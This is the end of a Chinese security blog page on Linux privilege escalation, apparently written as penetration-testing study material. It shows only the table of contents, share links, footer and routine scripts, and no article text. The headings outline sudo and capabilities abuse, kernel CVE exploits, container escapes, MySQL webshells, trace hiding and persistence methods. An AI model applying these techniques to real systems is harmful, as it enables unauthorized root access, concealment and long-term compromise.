class="toc-item toc-level-3"><a class="toc-link" href="#sudo-apache2"><span class="toc-number">6.2.</span> <span class="toc-text">sudo apache2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E8%BF%9E%E6%8E%A5%E5%85%B1%E4%BA%AB%E5%BA%93%E6%8F%90%E6%9D%83"><span class="toc-number">6.2.1.</span> <span class="toc-text">动态连接共享库提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BB%A5%E7%94%A8%E9%A2%84%E6%9C%9F%E5%8A%9F%E8%83%BD"><span class="toc-number">6.2.2.</span> <span class="toc-text">滥用预期功能</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-find"><span class="toc-number">6.3.</span> <span class="toc-text">sudo find</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-awk"><span class="toc-number">6.4.</span> <span class="toc-text">sudo awk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-zip"><span class="toc-number">6.5.</span> <span class="toc-text">sudo zip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-tar"><span class="toc-number">6.6.</span> <span class="toc-text">sudo tar</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-perl"><span class="toc-number">6.7.</span> <span class="toc-text">sudo perl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-vi-x2F-vim"><span class="toc-number">6.8.</span> <span class="toc-text">sudo vi&#x2F;vim</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-java"><span class="toc-number">6.9.</span> <span class="toc-text">sudo java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-man"><span class="toc-number">6.10.</span> <span class="toc-text">sudo man</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-wget"><span class="toc-number">6.11.</span> <span class="toc-text">sudo wget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-yum"><span class="toc-number">6.12.</span> <span class="toc-text">sudo yum</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-pkexec"><span class="toc-number">6.13.</span> <span class="toc-text">sudo pkexec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-systemctl"><span class="toc-number">6.14.</span> <span class="toc-text">sudo systemctl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-journalctl"><span class="toc-number">6.15.</span> <span class="toc-text">sudo journalctl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-strace"><span class="toc-number">6.16.</span> <span class="toc-text">sudo strace</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-taskset"><span class="toc-number">6.17.</span> <span class="toc-text">sudo taskset</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-pip-x2F-pip3"><span class="toc-number">6.18.</span> <span class="toc-text">sudo pip&#x2F;pip3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80"><span class="toc-number">6.18.1.</span> <span class="toc-text">法一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C"><span class="toc-number">6.18.2.</span> <span class="toc-text">法二</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-CVE-2019-14287-%E6%8F%90%E6%9D%83"><span class="toc-number">6.19.</span> <span class="toc-text">sudo CVE-2019-14287 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-CVE-2019-18634-%E6%8F%90%E6%9D%83"><span class="toc-number">6.20.</span> <span class="toc-text">sudo CVE-2019-18634 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-LD-PRELOAD%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83"><span class="toc-number">6.21.</span> <span class="toc-text">sudo LD_PRELOAD环境变量提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%B0%E4%B8%80%E4%B8%AA%E6%AF%94%E8%BE%83%E7%A7%80%E7%9A%84sudo%E6%8F%90%E6%9D%83"><span class="toc-number">6.22.</span> <span class="toc-text">记一个比较秀的sudo提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Capabilities"><span class="toc-number">7.</span> <span class="toc-text">Capabilities</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7"><span class="toc-number">7.1.</span> <span class="toc-text">管理工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E8%AE%BE%E7%BD%AE%E4%BA%86Capabilities%E7%9A%84%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6"><span class="toc-number">7.2.</span> <span class="toc-text">查找设置了Capabilities的可执行文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#perl"><span class="toc-number">7.3.</span> <span class="toc-text">perl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gdb"><span class="toc-number">7.4.</span> <span class="toc-text">gdb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php"><span class="toc-number">7.5.</span> <span class="toc-text">php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python"><span class="toc-number">7.6.</span> <span class="toc-text">python</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rvim"><span class="toc-number">7.7.</span> <span class="toc-text">rvim</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#vim"><span class="toc-number">7.8.</span> <span class="toc-text">vim</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tar"><span class="toc-number">7.9.</span> <span class="toc-text">tar</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#openssl"><span class="toc-number">7.10.</span> <span class="toc-text">openssl</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cron-jobs-%E6%8F%90%E6%9D%83"><span class="toc-number">8.</span> <span class="toc-text">cron jobs 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cron-%E6%97%A5%E5%BF%97"><span class="toc-number">8.1.</span> <span class="toc-text">cron 日志</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cron-jobs-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%EF%BC%88%E6%96%87%E4%BB%B6%E9%87%8D%E5%86%99%EF%BC%89"><span class="toc-number">8.2.</span> <span class="toc-text">cron jobs 文件权限（文件重写）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cron-jobs%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83"><span class="toc-number">8.3.</span> <span class="toc-text">cron jobs环境变量提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cron-jobs-%E9%80%9A%E9%85%8D%E7%AC%A6%E6%8F%90%E6%9D%83"><span class="toc-number">8.4.</span> <span class="toc-text">cron jobs 通配符提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83-%E5%8A%AB%E6%8C%81%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">9.</span> <span class="toc-text">环境变量提权(劫持环境变量)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-number">10.</span> <span class="toc-text">内核漏洞提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2021-3493"><span class="toc-number">10.1.</span> <span class="toc-text">CVE-2021-3493</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83-CVE-2016-5195"><span class="toc-number">10.2.</span> <span class="toc-text">脏牛提权 CVE-2016-5195</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2003-0127"><span class="toc-number">10.3.</span> <span class="toc-text">CVE-2003-0127</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2009-2698"><span class="toc-number">10.4.</span> <span class="toc-text">CVE-2009-2698</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2010-2959"><span class="toc-number">10.5.</span> <span class="toc-text">CVE-2010-2959</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2013-2094"><span class="toc-number">10.6.</span> <span class="toc-text">CVE-2013-2094</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2017-16995"><span class="toc-number">10.7.</span> <span class="toc-text">CVE-2017-16995</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2010-4170"><span class="toc-number">10.8.</span> <span class="toc-text">CVE-2010-4170</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2002-0056"><span class="toc-number">10.9.</span> <span class="toc-text">CVE-2002-0056</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%AC%AC%E4%B8%89%E6%96%B9%E7%A8%8B%E5%BA%8F"><span class="toc-number">11.</span> <span class="toc-text">其他第三方程序</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#USBCreator-D-Bus"><span class="toc-number">11.1.</span> <span class="toc-text">USBCreator D-Bus</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker%E6%8F%90%E6%9D%83"><span class="toc-number">11.2.</span> <span class="toc-text">Docker提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Docker-remote-api"><span class="toc-number">11.2.1.</span> <span class="toc-text">Docker remote api</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">11.2.1.1.</span> <span class="toc-text">利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LXD%E5%AE%B9%E5%99%A8%E6%8F%90%E6%9D%83"><span class="toc-number">11.3.</span> <span class="toc-text">LXD容器提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kubernetes-%E5%AE%B9%E5%99%A8"><span class="toc-number">11.4.</span> <span class="toc-text">Kubernetes 容器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2018-1002105"><span class="toc-number">11.4.1.</span> <span class="toc-text">CVE-2018-1002105</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2017-1002101"><span class="toc-number">11.4.2.</span> <span class="toc-text">CVE-2017-1002101</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mysql%E6%8F%90%E6%9D%83"><span class="toc-number">11.5.</span> <span class="toc-text">Mysql提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6without-sqlmap"><span class="toc-number">11.5.1.</span> <span class="toc-text">sql注入读取文件without sqlmap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E4%B8%80%E5%8F%A5%E8%AF%9D%E8%8E%B7%E5%BE%97webshell"><span class="toc-number">11.5.2.</span> <span class="toc-text">写一句话获得webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#secure-file-priv%E5%86%99%E4%B8%80%E5%8F%A5%E8%AF%9D"><span class="toc-number">11.5.2.1.</span> <span class="toc-text">secure-file-priv写一句话</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D"><span class="toc-number">11.5.2.2.</span> <span class="toc-text">日志写入一句话</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UDF"><span class="toc-number">11.5.3.</span> <span class="toc-text">UDF</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NFS"><span class="toc-number">11.6.</span> <span class="toc-text">NFS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#NFS%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E"><span class="toc-number">11.6.1.</span> <span class="toc-text">NFS版本漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93"><span class="toc-number">11.6.2.</span> <span class="toc-text">权限配置不当</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95%E5%8F%AF%E5%86%99"><span class="toc-number">11.6.3.</span> <span class="toc-text">共享目录可写</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-1"><span class="toc-number">11.6.4.</span> <span class="toc-text">敏感信息泄露</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB"><span class="toc-number">11.7.</span> <span class="toc-text">SMB</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SMB-Cry"><span class="toc-number">11.7.1.</span> <span class="toc-text">SMB_Cry</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2010-0926-Samba-smbd%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E"><span class="toc-number">11.7.2.</span> <span class="toc-text">CVE-2010-0926 Samba smbd默认配置目录遍历漏洞 </span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">12.</span> <span class="toc-text">其他</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rbash%E9%80%83%E9%80%B8"><span class="toc-number">12.1.</span> <span class="toc-text">rbash逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bash-dropping-privileges"><span class="toc-number">12.2.</span> <span class="toc-text">Bash dropping privileges</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mount-nosuid"><span class="toc-number">12.3.</span> <span class="toc-text">mount nosuid</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E7%97%95%E8%BF%B9"><span class="toc-number">13.</span> <span class="toc-text">隐藏痕迹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">13.1.</span> <span class="toc-text">隐藏命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Bash%E9%83%A8%E5%88%86%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">13.1.1.</span> <span class="toc-text">Bash部分环境变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E9%9A%90%E8%97%8F%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-number">13.1.2.</span> <span class="toc-text">常见隐藏执行命令的方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E5%89%8D%E5%B8%A6%E7%A9%BA%E6%A0%BC%E7%9A%84%E5%91%BD%E4%BB%A4%E4%B8%BA%E4%BB%80%E4%B9%88%E8%83%BD%E4%B8%8D%E8%A2%AB%E8%AE%B0%E5%BD%95"><span class="toc-number">13.1.3.</span> <span class="toc-text">命令前带空格的命令为什么能不被记录</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%85%E9%99%A4%E8%AE%B0%E5%BD%95%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91"><span class="toc-number">13.2.</span> <span class="toc-text">清除记录（待填坑</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">14.</span> <span class="toc-text">权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%90%AF"><span class="toc-number">14.1.</span> <span class="toc-text">自启</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#rc-d"><span class="toc-number">14.1.1.</span> <span class="toc-text">rc.d</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#systemctl"><span class="toc-number">14.1.2.</span> <span class="toc-text">systemctl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#service"><span class="toc-number">14.1.3.</span> <span class="toc-text">service</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shell%E5%90%AF%E5%8A%A8"><span class="toc-number">14.1.4.</span> <span class="toc-text">shell启动</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">14.2.</span> <span class="toc-text">计划任务</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#crontab"><span class="toc-number">14.2.1.</span> <span class="toc-text">crontab</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A9%BB%E7%95%99"><span class="toc-number">14.3.</span> <span class="toc-text">驻留</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81%E9%A2%84%E5%8A%A0%E8%BD%BD%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93"><span class="toc-number">14.3.1.</span> <span class="toc-text">劫持预加载动态链接库</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">15.</span> <span class="toc-text">参考文章</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://atsud0.me/2020/04/Linux%E6%8F%90%E6%9D%83/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://atsud0.me/2020/04/Linux%E6%8F%90%E6%9D%83/&text=Linux提权方式"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://atsud0.me/2020/04/Linux%E6%8F%90%E6%9D%83/&title=Linux提权方式"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Linux提权方式&body=Check out this article: https://atsud0.me/2020/04/Linux%E6%8F%90%E6%9D%83/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://atsud0.me/2020/04/Linux%E6%8F%90%E6%9D%83/&title=Linux提权方式"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://atsud0.me/2020/04/Linux%E6%8F%90%E6%9D%83/&name=Linux提权方式&description=&lt;p&gt;&lt;img src=&#34;https://images.atsud0.me/images/post/image-1586775110961.png&#34; alt=&#34;file&#34;&gt;&lt;br&gt;&lt;img src=&#34;https://images.atsud0.me/images/post/Linux_getsystem.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;del&gt;本文將會持續更新(大概)&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;当你在渗透过程中，你拿下的后门一开始都未必是root，一开始可能是一个较低权限的用户。这时候我们需要通过各种方式（如系统漏洞，软件缺陷）来提权，获得更高权限。&lt;/p&gt;
&lt;a href=&#34;https://tryhackme.com/room/linuxprivesc&#34; title=&#34;&#34; target=&#34;&#34;&gt;练习&lt;/a&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://atsud0.me/2020/04/Linux%E6%8F%90%E6%9D%83/&t=Linux提权方式"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2020-2024
    atsud0
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/links/">Friends</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/atsud0">Github</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

  <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "069018536ef0421ebc5bb5e449328773"}'></script>

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
